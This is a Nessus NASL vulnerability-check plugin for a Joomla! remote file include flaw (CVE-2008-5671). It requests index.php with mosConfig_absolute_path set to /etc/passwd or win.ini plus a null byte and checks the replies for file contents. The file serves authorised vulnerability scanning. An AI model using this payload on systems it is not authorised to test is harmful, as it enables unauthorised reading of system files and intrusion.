#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31095);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2008-5671");
  script_bugtraq_id(27795);
  script_osvdb_id(42123);

  script_name(english:"Joomla! 'mosConfig_absolute_path' Parameter Remote File Include");
  script_summary(english:"Attempts to read a local file with Joomla!.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Joomla! running on the remote host is affected by a
remote file include vulnerability due to improper sanitization of
user-supplied input to the 'mosConfig_absolute_path' parameter before
using it in the index.php script to include PHP code. Provided
'RG_EMULATION' is not defined in the configuration file (as would
typically occur when upgrading from an older version) and the PHP
'register_globals' setting is disabled, an unauthenticated, remote
attacker can exploit this issue to disclose arbitrary files or execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user ID.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Feb/207");
  # https://www.joomla.org/announcements/release-news/4609-joomla-1015-released.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?fd9988be");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! version 1.0.15 or later. Alternatively, edit the
application's configuration.php file to disable 'RG_EMULATION'.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:W/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:X/RL:W/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(94);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/02/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/02/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/02/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'LICENSE.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['LICENSE.php'] = "GNU GENERAL PUBLIC LICENSE";

vuln = FALSE;
error = FALSE;
foreach file (files)
{
  url = "/index.php?mosConfig_absolute_path=" + file + "%00";
  w = http_send_recv3(
    method : "GET",
    item   : dir + url,
    port   : port,
    exit_on_fail : TRUE
  );
  res = w[2];

  # There's a problem if...
  if (egrep(pattern:file_pats[file], string:res))
  {
    vuln = TRUE;
    contents = res;
    break;
  }
  # we get an error because magic_quotes was enabled
  else if (file + "\0/includes/version.php" >< res)
  {
    vuln = TRUE;
    error = TRUE;
    contents = strstr(res, file);
    break;
  }
  # we get an error claiming the file doesn't exist
  else if (
    "main(" +file+ "): failed to open stream: No such file" >< res ||
    "include("+file+") [function.include]: failed to open stream: No such file" >< res
  )
  {
    vuln = TRUE;
    error = TRUE;
    contents = strstr(res, file);
    break;
  }
  # we get an error about open_basedir restriction.
  else if ("open_basedir restriction in effect. File(" + file >< res)
  {
    vuln = TRUE;
    error = TRUE;
    contents = strstr(res, "open_basedir");
    break;
  }
}
if (vuln)
{
  if (error)
  {
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      generic     : TRUE,
      request     : make_list(install_url + url),
      output      : contents,
      rep_extra   :
       'Note that Nessus was not able to directly exploit this issue;'+
       '\nhowever, based on the error below, the install does appear to be'+
       '\naffected.'
    );
    exit(0);
  }
  if ("<br" >< contents) contents = contents - strstr(contents, "<br");
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    file        : file,
    request     : make_list(install_url + url),
    output      : contents,
    attach_type : 'text/plain'
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
